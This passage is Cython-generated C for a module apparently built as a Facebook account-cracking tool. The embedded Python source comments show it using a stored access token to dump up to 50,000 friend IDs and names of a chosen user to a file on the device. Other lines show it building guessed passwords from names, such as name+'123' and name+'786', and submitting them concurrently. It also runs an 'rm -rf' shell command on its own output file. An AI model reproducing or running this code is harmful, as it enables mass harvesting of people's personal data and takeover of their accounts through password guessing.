        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_XDECREF_SET(__pyx_v_id, ((PyObject*)__pyx_t_11));
        __pyx_t_11 = 0;

        /* "libme.pyx":945
 * 				file = open(_____ , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 */
        __pyx_t_11 = __Pyx_PyObject_Dict_GetItem(__pyx_v_ex, __pyx_n_s_friends); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 945, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_11);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_11, __pyx_n_s_data); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 945, __pyx_L21_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
        if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
          __pyx_t_11 = __pyx_t_4; __Pyx_INCREF(__pyx_t_11); __pyx_t_12 = 0;
          __pyx_t_13 = NULL;
        } else {
          __pyx_t_12 = -1; __pyx_t_11 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 945, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_13 = Py_TYPE(__pyx_t_11)->tp_iternext; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 945, __pyx_L21_error)
        }
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        for (;;) {
          if (likely(!__pyx_t_13)) {
            if (likely(PyList_CheckExact(__pyx_t_11))) {
              if (__pyx_t_12 >= PyList_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyList_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 945, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 945, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            } else {
              if (__pyx_t_12 >= PyTuple_GET_SIZE(__pyx_t_11)) break;
              #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
              __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_11, __pyx_t_12); __Pyx_INCREF(__pyx_t_4); __pyx_t_12++; if (unlikely(0 < 0)) __PYX_ERR(0, 945, __pyx_L21_error)
              #else
              __pyx_t_4 = PySequence_ITEM(__pyx_t_11, __pyx_t_12); __pyx_t_12++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 945, __pyx_L21_error)
              __Pyx_GOTREF(__pyx_t_4);
              #endif
            }
          } else {
            __pyx_t_4 = __pyx_t_13(__pyx_t_11);
            if (unlikely(!__pyx_t_4)) {
              PyObject* exc_type = PyErr_Occurred();
              if (exc_type) {
                if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                else __PYX_ERR(0, 945, __pyx_L21_error)
              }
              break;
            }
            __Pyx_GOTREF(__pyx_t_4);
          }
          __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_4);
          __pyx_t_4 = 0;

          /* "libme.pyx":946
 * 				id = []
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])             # <<<<<<<<<<<<<<
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 */
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 946, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = PyNumber_Add(__pyx_t_4, __pyx_kp_s__38); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 946, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 946, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_5 = PyNumber_Add(__pyx_t_8, __pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 946, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __pyx_t_14 = __Pyx_PyList_Append(__pyx_v_id, __pyx_t_5); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 946, __pyx_L21_error)
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "libme.pyx":947
 * 				for a in ex['friends']['data']:
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')             # <<<<<<<<<<<<<<
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 */
          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_write); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_4);
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_id); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_15 = PyNumber_Add(__pyx_t_8, __pyx_kp_s__38); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_v_a, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __pyx_t_16 = PyNumber_Add(__pyx_t_15, __pyx_t_8); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __pyx_t_8 = PyNumber_Add(__pyx_t_16, __pyx_kp_s__39); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_8);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
          __pyx_t_16 = NULL;
          if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
            __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_4);
            if (likely(__pyx_t_16)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
              __Pyx_INCREF(__pyx_t_16);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_4, function);
            }
          }
          __pyx_t_5 = (__pyx_t_16) ? __Pyx_PyObject_Call2Args(__pyx_t_4, __pyx_t_16, __pyx_t_8) : __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_8);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 947, __pyx_L21_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;

          /* "libme.pyx":945
 * 				file = open(_____ , 'a')
 * 				id = []
 * 				for a in ex['friends']['data']:             # <<<<<<<<<<<<<<
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 */
        }
        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;

        /* "libme.pyx":940
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      }
      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      goto __pyx_L28_try_end;
      __pyx_L21_error:;
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;
      __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;

      /* "libme.pyx":948
 * 					id.append(a['id']+"|"+a['name'])
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):             # <<<<<<<<<<<<<<
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()
 */
      __pyx_t_7 = __Pyx_PyErr_ExceptionMatches(__pyx_builtin_KeyError) || __Pyx_PyErr_ExceptionMatches(__pyx_builtin_IOError);
      if (__pyx_t_7) {
        __Pyx_AddTraceback("libme.James.__ma___sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
        if (__Pyx_GetException(&__pyx_t_11, &__pyx_t_5, &__pyx_t_4) < 0) __PYX_ERR(0, 948, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_11);
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GOTREF(__pyx_t_4);

        /* "libme.pyx":949
 * 					file.write(a['id']+"|"+a['name']+'\n')
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")             # <<<<<<<<<<<<<<
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()
 */
        __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__45, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 949, __pyx_L23_except_error)
        __Pyx_GOTREF(__pyx_t_8);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
        goto __pyx_L22_exception_handled;
      }
      goto __pyx_L23_except_error;
      __pyx_L23_except_error:;

      /* "libme.pyx":940
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 * 			try:             # <<<<<<<<<<<<<<
 * 				rex=requests.get("https://graph.facebook.com/%s?fields=friends.limit(50000)&access_token=%s"%(__ids,token))
 * 				ex=json.loads(rex.text)
 */
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      goto __pyx_L1_error;
      __pyx_L22_exception_handled:;
      __Pyx_XGIVEREF(__pyx_t_1);
      __Pyx_XGIVEREF(__pyx_t_2);
      __Pyx_XGIVEREF(__pyx_t_3);
      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_2, __pyx_t_3);
      __pyx_L28_try_end:;
    }

    /* "libme.pyx":937
 * 		os.system("rm -rf /sdcard/f_2.txt")
 * 		_____ = ("/sdcard/f_2.txt")
 * 		for zx in range(__total):             # <<<<<<<<<<<<<<
 * 			zx += 1
 * 			__ids=input("  [+] Enter User ID : ")
 */
  }
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":950
 * 			except(KeyError , IOError):
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()             # <<<<<<<<<<<<<<
 * 		__id=open(_____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 */
  if (unlikely(!__pyx_v_file)) { __Pyx_RaiseUnboundLocalError("file"); __PYX_ERR(0, 950, __pyx_L1_error) }
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_file, __pyx_n_s_close); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 950, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 950, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "libme.pyx":951
 * 				exit("  [!] Dump failed, maybe the user is wrong / doesn't have friends")
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()             # <<<<<<<<<<<<<<
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 */
  __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 951, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_INCREF(__pyx_v______);
  __Pyx_GIVEREF(__pyx_v______);
  PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_v______);
  __Pyx_INCREF(__pyx_n_s_r);
  __Pyx_GIVEREF(__pyx_n_s_r);
  PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_n_s_r);
  __pyx_t_5 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_4, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 951, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_5);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_readlines); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 951, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
  __pyx_t_5 = NULL;
  if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_4))) {
    __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
    if (likely(__pyx_t_5)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
      __Pyx_INCREF(__pyx_t_5);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_4, function);
    }
  }
  __pyx_t_6 = (__pyx_t_5) ? __Pyx_PyObject_CallOneArg(__pyx_t_4, __pyx_t_5) : __Pyx_PyObject_CallNoArg(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
  if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 951, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
  __pyx_v___id = __pyx_t_6;
  __pyx_t_6 = 0;

  /* "libme.pyx":952
 * 		file.close()
 * 		__id=open(_____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))             # <<<<<<<<<<<<<<
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):
 */
  __pyx_t_9 = PyObject_Length(__pyx_v___id); if (unlikely(__pyx_t_9 == ((Py_ssize_t)-1))) __PYX_ERR(0, 952, __pyx_L1_error)
  __pyx_t_6 = PyInt_FromSsize_t(__pyx_t_9); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 952, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  __pyx_t_4 = __Pyx_PyString_Format(__pyx_kp_s_Total_id_0_92m_s_0_97m, __pyx_t_6); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 952, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
  if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 952, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":953
 * 		__id=open(_____, 'r').readlines()
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))             # <<<<<<<<<<<<<<
 * 	def __Fr__rr__(self):
 * 		try:
 */
  __pyx_t_4 = __Pyx_PyString_FormatSafe(__pyx_kp_s_Extra_File_saved_in_s, __pyx_v______); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 953, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_4);
  if (__Pyx_PrintOne(0, __pyx_t_4) < 0) __PYX_ERR(0, 953, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;

  /* "libme.pyx":926
 * 							pwx = [ name, ft+"123", ft+"1234", ft+"12345", ft+"786"]
 * 						coeg.submit(self.__f_james__, uid, pwx)
 * 	def __ma___sal2__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			token=open('login.txt', 'r').read()
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_15);
  __Pyx_XDECREF(__pyx_t_16);
  __Pyx_AddTraceback("libme.James.__ma___sal2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_token);
  __Pyx_XDECREF(__pyx_v___total);
  __Pyx_XDECREF(__pyx_v______);
  __Pyx_XDECREF(__pyx_v_zx);
  __Pyx_XDECREF(__pyx_v___ids);
  __Pyx_XDECREF(__pyx_v_rex);
  __Pyx_XDECREF(__pyx_v_ex);
  __Pyx_XDECREF(__pyx_v_file);
  __Pyx_XDECREF(__pyx_v_id);
  __Pyx_XDECREF(__pyx_v_a);
  __Pyx_XDECREF(__pyx_v___id);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":954
 * 		print("  [] Total id > \033[0;92m%s\033[0;97m"%(len(__id)))
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):             # <<<<<<<<<<<<<<
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_61__Fr__rr__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_61__Fr__rr__ = {"__Fr__rr__", (PyCFunction)__pyx_pw_5libme_5James_61__Fr__rr__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_61__Fr__rr__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Fr__rr__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_60__Fr__rr__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_60__Fr__rr__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_myfile = NULL;
  PyObject *__pyx_v_line = NULL;
  PyObject *__pyx_v_ask = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_name = NULL;
  PyObject *__pyx_v_ft = NULL;
  PyObject *__pyx_v_pwx = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  Py_ssize_t __pyx_t_7;
  PyObject *(*__pyx_t_8)(PyObject *);
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_t_12;
  int __pyx_t_13;
  PyObject *__pyx_t_14 = NULL;
  PyObject *(*__pyx_t_15)(PyObject *);
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  Py_ssize_t __pyx_t_20;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__Fr__rr__", 0);

  /* "libme.pyx":955
 * 		print("  [] Extra File saved in > %s"%(_____))
 * 	def __Fr__rr__(self):
 * 		try:             # <<<<<<<<<<<<<<
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 * 			for line in open(myfile, 'r').readlines():
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_2, &__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_1);
    __Pyx_XGOTREF(__pyx_t_2);
    __Pyx_XGOTREF(__pyx_t_3);
    /*try:*/ {

      /* "libme.pyx":956
 * 	def __Fr__rr__(self):
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'             # <<<<<<<<<<<<<<
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())
 */
      __Pyx_INCREF(__pyx_kp_s_storage_emulated_0_f__rindlist);
      __pyx_v_myfile = __pyx_kp_s_storage_emulated_0_f__rindlist;

      /* "libme.pyx":957
 * 		try:
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 * 			for line in open(myfile, 'r').readlines():             # <<<<<<<<<<<<<<
 * 				self.id.append(line.strip())
 * 		except IOError:
 */
      __pyx_t_5 = PyTuple_New(2); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 957, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_INCREF(__pyx_v_myfile);
      __Pyx_GIVEREF(__pyx_v_myfile);
      PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_v_myfile);
      __Pyx_INCREF(__pyx_n_s_r);
      __Pyx_GIVEREF(__pyx_n_s_r);
      PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_n_s_r);
      __pyx_t_6 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_5, NULL); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 957, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_readlines); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 957, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_5);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
        __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_5);
        if (likely(__pyx_t_6)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
          __Pyx_INCREF(__pyx_t_6);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_5, function);
        }
      }
      __pyx_t_4 = (__pyx_t_6) ? __Pyx_PyObject_CallOneArg(__pyx_t_5, __pyx_t_6) : __Pyx_PyObject_CallNoArg(__pyx_t_5);
      __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
      if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 957, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_4);
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (likely(PyList_CheckExact(__pyx_t_4)) || PyTuple_CheckExact(__pyx_t_4)) {
        __pyx_t_5 = __pyx_t_4; __Pyx_INCREF(__pyx_t_5); __pyx_t_7 = 0;
        __pyx_t_8 = NULL;
      } else {
        __pyx_t_7 = -1; __pyx_t_5 = PyObject_GetIter(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 957, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_8 = Py_TYPE(__pyx_t_5)->tp_iternext; if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 957, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
      for (;;) {
        if (likely(!__pyx_t_8)) {
          if (likely(PyList_CheckExact(__pyx_t_5))) {
            if (__pyx_t_7 >= PyList_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyList_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 957, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 957, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          } else {
            if (__pyx_t_7 >= PyTuple_GET_SIZE(__pyx_t_5)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_4 = PyTuple_GET_ITEM(__pyx_t_5, __pyx_t_7); __Pyx_INCREF(__pyx_t_4); __pyx_t_7++; if (unlikely(0 < 0)) __PYX_ERR(0, 957, __pyx_L3_error)
            #else
            __pyx_t_4 = PySequence_ITEM(__pyx_t_5, __pyx_t_7); __pyx_t_7++; if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 957, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_4);
            #endif
          }
        } else {
          __pyx_t_4 = __pyx_t_8(__pyx_t_5);
          if (unlikely(!__pyx_t_4)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 957, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_4);
        }
        __Pyx_XDECREF_SET(__pyx_v_line, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "libme.pyx":958
 * 			myfile = '/storage/emulated/0/f__rindlist.txt'
 * 			for line in open(myfile, 'r').readlines():
 * 				self.id.append(line.strip())             # <<<<<<<<<<<<<<
 * 		except IOError:
 * 			exit("\n [!] Please Dump File first %s "%(myfile))
 */
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 958, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_line, __pyx_n_s_strip); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 958, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_10 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_10 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_10)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_10);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
          }
        }
        __pyx_t_6 = (__pyx_t_10) ? __Pyx_PyObject_CallOneArg(__pyx_t_9, __pyx_t_10) : __Pyx_PyObject_CallNoArg(__pyx_t_9);
        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;
        if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 958, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_6);
